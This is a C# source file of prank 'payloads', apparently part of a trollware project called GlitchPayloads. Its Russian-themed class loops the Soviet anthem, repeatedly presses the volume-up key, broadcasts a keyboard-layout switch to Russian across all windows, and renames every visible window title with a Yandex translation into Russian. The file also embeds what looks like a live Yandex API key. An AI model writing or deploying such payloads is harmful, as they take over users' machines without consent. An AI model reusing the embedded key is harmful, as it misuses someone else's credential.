using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using CC_Functions.W32;
using GlitchPayloads.Properties;
using Misc;
using Yandex.Translator;

namespace GlitchPayloads
{
    [PayloadClass]
    public static class Russian
    {
        private static readonly IYandexTranslator translator = Yandex.Translator.Yandex.Translator(api =>
            api.ApiKey("trnsl.1.1.20200118T180605Z.654f2ec649458c36.107c6ad38dc02937f25e660aa1f8f4097d6561a8")
                .Format(ApiDataFormat.Json));

        private static Dictionary<IntPtr, string> translatedWindows = new Dictionary<IntPtr, string>();

        [Payload("Soviet Anthem", true, 100, 0, true)]
        public static void PayloadMusic()
        {
            SoundPlayer player = new SoundPlayer(Resources.Soviet_National_Anthem);
            while (true)
                player.PlaySync();
        }

        [Payload("Force max volume", false, 100, 100)]
        public static void PayloadVolume()
        {
            keybd_event(175, 0, 0, 0);
        }

        [DllImport("user32.dll")]
        private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

        [Payload("Set Language", false, 60, 0, true)]
        public static void PayloadLanguage()
        {
            PostMessage(0xffff, 0x0050, IntPtr.Zero,
                LoadKeyboardLayout(new CultureInfo("ru-ru").LCID.ToString("x8"), 1));
        }

        [DllImport("user32.dll")]
        private static extern bool PostMessage(int hhwnd, uint msg, IntPtr wparam, IntPtr lparam);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadKeyboardLayout(string pwszKLID, uint Flags);

        [Payload("Translate titles", false, 300, 500)]
        public static void PayloadTranslate()
        {
            Wnd32[] wnds = Wnd32.Visible;
            translatedWindows = translatedWindows.Where(s => !wnds.Contains(Wnd32.FromHandle(s.Key)))
                .ToDictionary(s => s.Key, s => s.Value);
            for (int i = 0; i < wnds.Length; i++)
                try
                {
                    Wnd32 wnd = wnds[i];
                    if (translatedWindows.ContainsKey(wnd.HWnd) && translatedWindows[wnd.HWnd] == wnd.Title) continue;
                    translatedWindows[wnd.HWnd] = translator.Translate("ru", wnd.Title).Text;
                    SetWindowTextW(wnd.HWnd, translatedWindows[wnd.HWnd]);
                }
                catch
                {
                }
        }

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool SetWindowTextW(IntPtr hWnd, string lpString);
    }
}